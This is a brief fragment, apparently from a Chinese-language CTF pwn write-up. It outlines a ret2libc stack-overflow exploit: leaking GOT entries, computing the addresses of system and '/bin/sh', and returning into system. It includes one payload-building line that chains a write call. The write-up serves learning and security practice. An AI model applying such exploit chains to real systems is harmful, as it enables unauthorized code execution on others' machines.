...
* 先通过text中的`read`函数，打印出got表，计算`system`和`/bin/sh`的地址，再返回到`do_func`函数，按照栈溢出的常规操作ret2到`system`
...
payload += p64(write_sym) + p64(return_addr)  # 这里相当于call了一次write_sym，return_addr为设置的返回地址
